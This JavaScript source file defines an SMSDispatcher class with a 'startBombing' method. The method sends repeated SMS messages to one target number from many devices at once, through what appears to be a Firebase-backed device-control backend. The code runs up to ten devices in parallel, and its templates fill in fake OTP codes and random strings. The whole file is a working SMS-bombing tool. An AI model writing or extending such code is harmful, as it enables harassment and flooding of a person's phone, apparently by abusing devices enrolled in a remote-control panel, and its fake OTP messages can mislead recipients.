const logger = require('../utils/logger');
const { generateOTP, generateRandom } = require('./templates');

class SMSDispatcher {
  constructor(firebaseManager, state) {
    this.firebaseManager = firebaseManager;
    this.state = state;
    this.stopped = false;
  }

  async startBombing(devices, options) {
    this.stopped = false;

    const {
      targetNumber,
      messageTemplate,
      simSlot = 1,
      messageCount = 1,
      delay = 500,
      onProgress,
      onLog,
      onComplete
    } = options;

    const totalMessages = devices.length * messageCount;
    let sent = 0;
    let failed = 0;

    onLog(`📊 Total messages to send: ${totalMessages}`);

    const workerPool = devices.map((device, index) => ({
      id: index,
      device,
      messages: messageCount,
      sent: 0,
      failed: 0
    }));

    const concurrency = Math.min(devices.length, 10);
    const chunks = this.chunkArray(workerPool, concurrency);

    for (const chunk of chunks) {
      if (this.stopped) break;
      const promises = chunk.map(worker => this.processWorker(worker, {
        targetNumber,
        messageTemplate,
        simSlot,
        delay,
        onProgress: (s, f) => {
          sent += s;
          failed += f;
          if (onProgress) onProgress(sent, failed, totalMessages);
        },
        onLog
      }));
      await Promise.all(promises);
    }

    this.active = false;
    onLog(`✅ Bombing complete! Sent: ${sent}, Failed: ${failed}`);
    if (onComplete) onComplete();
  }

  async processWorker(worker, options) {
    const { device, messages } = worker;
    const { targetNumber, messageTemplate, simSlot, delay, onProgress, onLog } = options;

    let sent = 0;
    let failed = 0;
    const deviceName = device.device?.modelName || device.deviceId;

    onLog(`🔹 Worker ${worker.id} started for ${deviceName}`);

    for (let i = 0; i < messages; i++) {
      if (this.stopped) break;

      let message = messageTemplate
        .replace(/{OTP}/g, generateOTP())
        .replace(/{RANDOM}/g, generateRandom(8))
        .replace(/{DEVICE}/g, deviceName)
        .replace(/{PHONE}/g, device.device?.mobNo || 'Unknown')
        .replace(/{TIME}/g, new Date().toLocaleString());

      const payload = {
        from: simSlot,
        to: targetNumber,
        message: message,
        isSended: false
      };

      try {
        const result = await this.firebaseManager.sendSMS(device.dbId, device.deviceId, payload);
        if (result.success) {
          sent++;
          onLog(`✅ ${deviceName} → ${targetNumber} (${i + 1}/${messages})`);
        } else {
          failed++;
          onLog(`❌ ${deviceName} failed: ${result.error}`);
        }
      } catch (err) {
        failed++;
        onLog(`❌ ${deviceName} error: ${err.message}`);
      }

      if (onProgress) onProgress(sent, failed);

      if (i < messages - 1 && delay > 0) {
        await this.sleep(delay);
      }
    }

    onLog(`🔹 Worker ${worker.id} done. Sent: ${sent}, Failed: ${failed}`);
    return { sent, failed };
  }

  stop() { this.stopped = true; }
  chunkArray(array, size) {
    const chunks = [];
    for (let i = 0; i < array.length; i += size) {
      chunks.push(array.slice(i, i + size));
    }
    return chunks;
  }
  sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
}

module.exports = SMSDispatcher;